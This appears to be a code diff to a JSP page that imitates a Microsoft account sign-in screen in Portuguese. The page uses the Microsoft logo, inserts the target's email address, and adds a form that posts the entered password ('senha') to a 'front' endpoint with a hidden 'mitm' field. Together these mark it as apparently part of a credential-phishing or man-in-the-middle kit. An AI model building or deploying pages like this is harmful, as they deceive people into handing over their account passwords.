@@ -1,3 +1,5 @@
+<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
+<%@page contentType="text/html" pageEncoding="UTF-8"%>
 <!DOCTYPE html>
 <html>
     <head>
@@ -24,23 +26,27 @@
                         <form>
                             <br>
                             <img src="https://auth.gfx.ms/16.000.27887.2/images/microsoft_logo.png?x=ed9c9eb0dce17d752bedea6b5acda6d9"/>
-                            <br><br><a href="index.html"><-</a> user@gmail.com<br>
+                            <br><br><a href="index.html"><-</a>${email}<br>
 
                             <h5><b>Insira a senha</b></h5>
-                            
-                            <input type="text" placeholder="Senha"/>
-                            <br>
-                            <input type="checkbox" class="filled-in"/>
-                            <label>
-                                <input type="checkbox">
-                                <span>Mantenha-me conectado</span>
-                            </label>
-                            <br>
-                            <br><label style="font-size: 12px"><a href="#">Esqueci minha senha</a></label>
-                            <br>
-                            
-                            <input type="submit" value="Entrar" class="btn"/>
-                            <br><br>
+                            <form method="post" action="front">
+                                <input type="text" placeholder="Senha" name="senha"/>
+                                <br>
+                                <input type="checkbox" class="filled-in"/>
+                                <input type="hidden" name="mitm" value="mitm"/>
+                                <label>
+                                    <input type="checkbox">
+                                    <span>Mantenha-me conectado</span>
+                                </label>
+                                <br>
+                                <br><label style="font-size: 12px"><a href="#">
+                                        Esqueci minha senha</a></label>
+                                <br>
+
+                                <input type="submit" value="Entrar" class="btn"/>
+                                <br><br>
+                            </form>
+
                         </form>
 
                     </div>
